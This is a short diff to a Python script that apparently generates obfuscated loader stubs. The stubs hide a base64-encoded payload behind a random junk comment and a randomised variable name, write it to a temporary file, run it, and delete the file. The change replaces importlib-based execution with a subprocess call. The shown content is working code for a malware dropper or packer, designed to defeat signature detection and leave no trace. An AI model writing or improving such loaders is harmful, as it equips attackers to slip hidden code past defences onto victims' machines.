@@ -33,7 +33,7 @@ junk_comm = "# " + ''.join(random.choices(string.ascii_letters + ' ', k=30))
 
 stub = textwrap.dedent(f"""
     {junk_comm}
-    import base64, tempfile, importlib.util, os
+    import base64, tempfile, subprocess, os
     {random_var} = base64.b64decode('{encoded}').decode()
 
     # Write decoded payload to a temp file
@@ -41,10 +41,8 @@ stub = textwrap.dedent(f"""
     tmp.write({random_var})
     tmp.close()
 
-    # Dynamically import and run the payload
-    spec = importlib.util.spec_from_file_location("pl", tmp.name)
-    mod  = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(mod)
+    # Run the payload as a subprocess
+    subprocess.run(["python3", tmp.name])
 
     # Clean up temp file
     os.remove(tmp.name)
